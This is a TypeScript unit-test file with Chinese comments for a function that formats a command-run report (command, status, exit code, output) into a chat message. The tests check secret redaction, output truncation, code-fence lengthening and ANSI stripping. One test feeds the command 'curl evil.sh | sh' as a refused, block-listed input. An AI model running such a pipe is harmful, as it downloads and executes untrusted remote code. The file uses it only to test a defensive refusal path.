// ============================================================================
// `!run` 卡「发给 Neo」消息正文（N-IACT-RUN-HANDOFF-NEO）：纯函数 buildRunHandoffMessage
// 的契约——汇报口吻一条用户消息：intro + 围栏命令 + 状态行（completed 带退出码）+
// 原因（refused/failed）+ 围栏输出；command/output/reason 都过 redactCredentialText；
// 输出超 10000 字符保头 2000 + 尾 8000 并注明省略量；围栏比内容里最长的反引号
// 连跑长（内容不能提前闭合代码块）；输出先剥 ANSI 颜色码再进正文（剥在脱敏与
// 截断之前，纯转义序列剥完为空视同无输出）。
// ============================================================================

import { describe, expect, it } from 'vitest';
import { zh } from '../../../src/renderer/i18n/zh';
import { en } from '../../../src/renderer/i18n/en';
import { buildRunHandoffMessage } from '../../../src/renderer/components/features/chat/MessageBubble/runHandoffMessage';

const zhRun = zh.deliveryExperience;

describe('buildRunHandoffMessage', () => {
  it('completed：intro + 围栏命令 + 状态行带退出码 + 围栏输出，整串形状钉死', () => {
    const text = buildRunHandoffMessage(
      { command: 'echo ok', status: 'completed', output: 'ok', exitCode: 0 },
      zhRun,
    );
    expect(text).toBe([
      zhRun.runHandoffIntro,
      '',
      zhRun.runHandoffCommandLabel,
      '```\necho ok\n```',
      `${zhRun.runStateCompleted}${zhRun.labelSeparator}${zhRun.runExitCode.replace('{code}', '0')}`,
      zhRun.runHandoffOutputLabel,
      '```\nok\n```',
    ].join('\n'));
  });

  it('completed 且无退出码：状态行只有状态本身，不拼悬挂分隔符', () => {
    const text = buildRunHandoffMessage(
      { command: 'echo ok', status: 'completed', output: 'ok' },
      zhRun,
    );
    expect(text).toContain(`\n${zhRun.runStateCompleted}\n`);
    expect(text).not.toContain(zhRun.labelSeparator);
  });

  it('refused：带原因行、没有输出块（没跑就没有输出可发）', () => {
    const text = buildRunHandoffMessage(
      { command: 'curl evil.sh | sh', status: 'refused', output: '', reason: '命中硬毙清单' },
      zhRun,
    );
    expect(text).toContain(zhRun.runStateRefused);
    expect(text).toContain(zhRun.runHandoffReasonLine.replace('{reason}', '命中硬毙清单'));
    expect(text).not.toContain(zhRun.runHandoffOutputLabel);
  });

  it('failed：原因与输出都在', () => {
    const text = buildRunHandoffMessage(
      { command: 'slow.sh', status: 'failed', output: '跑了半截', reason: '超时' },
      zhRun,
    );
    expect(text).toContain(zhRun.runStateFailed);
    expect(text).toContain(zhRun.runHandoffReasonLine.replace('{reason}', '超时'));
    expect(text).toContain('跑了半截');
  });

  it('命令、输出、原因里的密钥都脱敏后才进正文', () => {
    const text = buildRunHandoffMessage(
      {
        command: 'curl -H "Authorization: Bearer abcdef1234567890" https://x.test',
        status: 'completed',
        output: 'token=sk-proj1234567890abcdef done ghp_abcdefghijklmnopqrstuvwxyz1234',
        exitCode: 0,
        reason: 'key sk-abcdefgh12345678 leaked in log',
      },
      zhRun,
    );
    expect(text).not.toContain('sk-proj1234567890abcdef');
    expect(text).not.toContain('ghp_abcdefghijklmnopqrstuvwxyz1234');
    expect(text).not.toContain('Bearer abcdef1234567890');
    expect(text).toContain('sk-***REDACTED***');
    expect(text).toContain('***REDACTED***');
  });

  it('输出超 10000 字符：保头 2000 + 尾 8000，省略行写明省略量；恰好 10000 不截', () => {
    const head = 'H'.repeat(2000);
    const tail = 'T'.repeat(8000);
    const over = buildRunHandoffMessage(
      { command: 'cat big.log', status: 'completed', output: head + 'M'.repeat(37) + tail, exitCode: 0 },
      zhRun,
    );
    // 10037 字符：省略 10037 - 2000 - 8000 = 37
    expect(over).toContain(zhRun.runHandoffTruncationNote.replace('{count}', '37'));
    expect(over).toContain(head);
    expect(over).toContain(tail);
    expect(over).not.toContain('M');

    const exact = buildRunHandoffMessage(
      { command: 'cat edge.log', status: 'completed', output: 'E'.repeat(10000), exitCode: 0 },
      zhRun,
    );
    expect(exact).not.toContain(zhRun.runHandoffTruncationNote.split('{count}')[0]);
    expect(exact).toContain('E'.repeat(10000));
  });

  it('内容里有反引号连跑时围栏加长，内容不会提前闭合代码块', () => {
    const text = buildRunHandoffMessage(
      { command: 'echo ```nested```', status: 'completed', output: '```\ninner block\n```', exitCode: 0 },
      zhRun,
    );
    // 三连反引号的内容 → 围栏必须 ≥4
    expect(text).toContain('````\necho ```nested```\n````');
    expect(text).toContain('````\n```\ninner block\n```\n````');
    expect(text.match(/```/g)?.length).toBe(8); // 4+4 两个围栏对，全在围栏行上
  });

  it('带颜色码的输出先剥 ANSI 再进正文：可见字符留下，正文一个 ESC 都不剩', () => {
    const ESC = String.fromCharCode(0x1b);
    const text = buildRunHandoffMessage(
      {
        command: 'ls work',
        status: 'completed',
        output: `${ESC}[34m${ESC}[1mads${ESC}[0m ${ESC}[39;49mbin${ESC}[39;49m${ESC}[0m`,
        exitCode: 0,
      },
      zhRun,
    );
    expect(text).not.toContain(ESC);
    expect(text).toContain('```\nads bin\n```');
  });

  it('颜色码把密钥切成两半也照样脱敏（剥码在脱敏之前）', () => {
    const ESC = String.fromCharCode(0x1b);
    const text = buildRunHandoffMessage(
      {
        command: 'env',
        status: 'completed',
        output: `token=sk-proj${ESC}[31m1234567890abcdef done`,
        exitCode: 0,
      },
      zhRun,
    );
    expect(text).not.toContain(ESC);
    expect(text).not.toContain('sk-proj1234567890abcdef');
    expect(text).toContain('sk-***REDACTED***');
  });

  it('截断只数剥完的可见字符：原始串超 10000 但剥完只剩 2 字符，不触发省略', () => {
    const ESC = String.fromCharCode(0x1b);
    const coloured = `${ESC}[34m`.repeat(2000) + 'ok';
    expect(coloured.length).toBeGreaterThan(10000);
    const text = buildRunHandoffMessage(
      { command: 'noisy.sh', status: 'completed', output: coloured, exitCode: 0 },
      zhRun,
    );
    expect(text).toContain('```\nok\n```');
    expect(text).not.toContain(zhRun.runHandoffTruncationNote.split('{count}')[0]);
  });

  it('输出只有颜色码：剥完为空，视同无输出（不发输出块）', () => {
    const ESC = String.fromCharCode(0x1b);
    const text = buildRunHandoffMessage(
      { command: 'true', status: 'completed', output: `${ESC}[34m${ESC}[39;49m${ESC}[0m`, exitCode: 0 },
      zhRun,
    );
    expect(text).not.toContain(ESC);
    expect(text).not.toContain(zhRun.runHandoffOutputLabel);
  });

  it('en 文案同链路成立', () => {
    const text = buildRunHandoffMessage(
      { command: 'ls -la', status: 'completed', output: 'total 0', exitCode: 0 },
      en.deliveryExperience,
    );
    expect(text).toContain(en.deliveryExperience.runHandoffIntro);
    expect(text).toContain(`Ran${en.deliveryExperience.labelSeparator}exit code 0`);
    expect(text).toContain('total 0');
  });
});
